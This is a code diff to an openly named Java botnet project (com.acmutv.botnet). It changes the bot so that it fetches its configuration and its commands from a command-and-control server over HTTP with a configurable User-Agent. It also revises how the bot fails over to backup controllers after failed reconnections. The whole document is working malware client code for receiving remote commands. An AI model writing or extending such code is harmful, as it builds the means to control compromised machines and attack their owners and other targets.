@@ -44,6 +44,8 @@ import com.acmutv.botnet.core.report.*;
 import com.acmutv.botnet.core.exec.BotState;
 import com.acmutv.botnet.log.AppLogMarkers;
 import com.acmutv.botnet.tool.io.IOManager;
+import com.acmutv.botnet.tool.net.HttpManager;
+import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
@@ -55,10 +57,13 @@ import org.quartz.CronExpression;
 import org.quartz.SchedulerException;
 
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.SocketException;
+import java.net.URL;
 import java.net.UnknownHostException;
 import java.text.ParseException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
@@ -235,7 +240,17 @@ public class CoreController {
       final String initResource = controller.getInitResource();
       LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
       try {
-        AppConfigurationService.load(AppConfigurationFormat.JSON, initResource);
+        if (HttpManager.isHttpUrl(initResource)) {
+          HttpMethod method = HttpMethod.GET;
+          URL url = new URL(initResource);
+          Map<String,String> props = new HashMap<String,String>(){{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
+          try (InputStream in =
+                   HttpManager.getResponseBodyAsInputStream(method, url, props)) {
+            AppConfigurationService.load(AppConfigurationFormat.JSON, in);
+          }
+        } else {
+          AppConfigurationService.load(AppConfigurationFormat.JSON, initResource);
+        }
         controllerId = 0;
         controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
         success = true;
@@ -247,8 +262,8 @@ public class CoreController {
             waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
           } catch (InterruptedException ignored) { }
         } else {
-          if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
-            LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
+          LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
+          if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
             controllerId ++;
             failures = 0;
           } else {
@@ -629,7 +644,18 @@ public class CoreController {
     LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
     BotCommand cmd;
     try {
-      cmd = BotCommandService.consumeJsonResource(cmdResource);
+      if (HttpManager.isHttpUrl(cmdResource)) {
+        HttpMethod method = HttpMethod.GET;
+        URL url = new URL(cmdResource);
+        Map<String,String> props = new HashMap<String,String>()
+        {{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
+        try (InputStream in =
+                 HttpManager.getResponseBodyAsInputStream(method, url, props)) {
+          cmd = BotCommandService.fromJson(in);
+        }
+      } else {
+        cmd = BotCommandService.consumeJsonResource(cmdResource);
+      }
     } catch (IOException exc) {
       throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
     }
